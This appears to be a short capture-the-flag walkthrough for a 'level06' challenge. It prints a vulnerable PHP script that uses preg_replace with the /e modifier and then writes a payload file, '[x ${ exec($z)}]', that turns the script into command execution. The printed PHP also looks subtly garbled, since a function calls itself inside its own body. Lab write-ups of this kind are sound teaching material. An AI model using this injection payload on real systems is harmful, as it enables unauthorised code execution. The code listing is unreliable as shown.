1. `ls`
   ```
   level06  level06.php
   ```

2. `cat level06.php`
   ```php
   function y($m) {
      $m = preg_replace("/\./", " x ", $m);
      $m = preg_replace("/@/", " y", $m);
      return $m;
   }

   function x($y, $z) {
      $a = file_get_contents($y);
      $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
      $r = x($argv[1], $argv[2]);
      $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a);
      return $a;
   }
      
   $r = x($argv[1], $argv[2]);
   print $r;
   ```

3. `echo 'hello' > /tmp/payload && ./level06 /tmp/payload`
   ```bash
   hello
   ```

4. `echo '[x $z]' > /tmp/payload && ./level06 /tmp/payload 'id'`
   ```bash
   id
   ```

5. `echo '[x ${ exec($z)}]' > /tmp/payload && ./level06 /tmp/payload 'getflag'`
